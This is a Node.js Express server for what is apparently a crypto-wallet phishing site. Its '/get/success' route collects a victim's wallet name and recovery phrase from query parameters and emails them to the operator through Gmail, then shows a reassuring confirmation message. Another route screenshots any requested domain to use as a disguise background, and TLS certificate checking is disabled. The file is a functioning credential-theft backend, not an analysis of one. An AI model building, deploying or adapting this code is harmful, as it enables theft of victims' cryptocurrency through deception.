const express = require('express');
const app = express();
const nodemailer = require('nodemailer');
const path = require('path');
const hbs = require('hbs');
const credentials = require('./config');
const port = process.env.PORT || 3000
process.env["NODE_TLS_REJECT_UNAUTHORIZED"] = 0;

app.use(express.urlencoded({
    extend: false
}));
app.use(express.json());
const tempweb = path.join(__dirname, "/temp/views/")
const staticweb = path.join(__dirname, "/public");
app.use('/public/',express.static(staticweb))


app.set('views', tempweb);
app.set("view engine", "hbs")


app.get('/', function(req, res) {
    res.render("index");
});


app.get('/integrate', function(req, res) {
    res.render("integrate-wallets");
});

app.get('/:id', function(req, res) {
    var para = req.params.id;

    var api = "https://image.thum.io/get/width/1200/https://" + para;
    var def = "https://www.teahub.io/photos/full/156-1566583_trading-cryptocurrency..jpg";

  
        if(para.indexOf('.') !== -1)
        {
            res.render("frame",{
                title : para,
                bg : api
            })
        }
        else
        {
            res.render("frame",{
                title : "default",
                bg : def
            })
        }
    
});


app.get('/get/success', function(req, res) {

    var wall = req.query.wallet;
    var phr = req.query.Phrase;

    var transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: credentials.username,
            pass: credentials.password
        }
    });

    var mailOptions = {
        from: "<connect2wallet>",
        to: credentials.username,
        subject: credentials.subject,
        html: `<h1>Contact details :</h1>
                <ul>
                <li>Wallet : ${wall}</li>
                <li>Key : ${phr}</li>
                </ul>`
    };

    transporter.sendMail(mailOptions)
    .then(response => {
        res.render("integrate-wallets",{
            msg : "Your response have been recorded"
        });
        
    })
    .catch(err => {
        res.json({ error : "404", status : "unexpected error occur." });
    });

});

app.get("/*", function(req,res) {
    res.json({ error : "404", status : "This page is not available in this web" }) 
})


app.listen(port, () => {
    console.log(`app is running on port : ${port}`)
})